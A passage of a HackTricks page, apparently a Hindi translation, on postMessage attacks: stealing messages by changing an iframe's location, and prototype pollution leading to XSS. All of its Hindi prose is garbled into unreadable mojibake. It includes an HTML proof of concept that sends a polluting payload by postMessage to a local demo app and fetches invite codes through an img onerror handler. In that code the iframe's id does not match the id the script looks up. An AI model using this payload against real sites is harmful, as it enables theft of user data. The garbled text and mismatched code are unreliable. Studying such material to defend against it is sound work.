рдпрджрд┐ рдЖрдк X-Frame-Header рдХреЗ рдмрд┐рдирд╛ рдПрдХ рд╡реЗрдмрдкреЗрдЬ рдХреЛ iframe рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдФрд░ iframe рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЖрдк **рдЙрд╕ рдмрдЪреНрдЪреЗ рдХреЗ iframe рдХрд╛ рд╕реНрдерд╛рди рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ**, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рд╡рд╣ рдПрдХ **postmessage** рдкреНрд░рд╛рдкреНрдд рдХрд░ рд░рд╣рд╛ рд╣реИ рдЬреЛ рдПрдХ **рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреЗрдЬрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **рдЙрд╕ iframe рдХреА рдЙрддреНрдкрддреНрддрд┐ рдХреЛ рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ** рдПрдХ рдкреГрд╖реНрда рдХреЗ рд▓рд┐рдП рдЬреЛ рдЙрд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ **рдирд┐рдпрдВрддреНрд░рд┐рдд** рд╣реЛрддрд╛ рд╣реИ рдФрд░ рд╕рдВрджреЗрд╢ рдХреЛ **рдЪреБрд░рд╛** рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ Prototype Pollution рдФрд░/рдпрд╛ XSS

рдРрд╕реА рдкрд░рд┐рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ `postMessage` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬрд╛ рдЧрдпрд╛ рдбреЗрдЯрд╛ JS рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЖрдк **рдкреГрд╖реНрда** рдХреЛ **iframe** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ `postMessage` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬрдХрд░ **prototype pollution/XSS** рдХрд╛ **рд╢реЛрд╖рдг** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

`postMessage` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдмрд╣реБрдд рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ XSS** рдХреЗ рдХреБрдЫ рдЙрджрд╛рд╣рд░рдг рдЖрдк [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html) рдкрд░ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

`postMessage` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ `iframe` рдореЗрдВ **Prototype Pollution рдФрд░ рдлрд┐рд░ XSS** рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрджрд╛рд╣рд░рдг:
```markup
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП**:

* [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/) рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкреГрд╖реНрда рдХреА рд▓рд┐рдВрдХ
* [**XSS**](../xss-cross-site-scripting/) рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкреГрд╖реНрда рдХреА рд▓рд┐рдВрдХ
* [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss) рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкреГрд╖реНрда рдХреА рд▓рд┐рдВрдХ

## рд╕рдВрджрд░реНрдн

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* рдЕрднреНрдпрд╛рд╕ рдХреЗ рд▓рд┐рдП: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
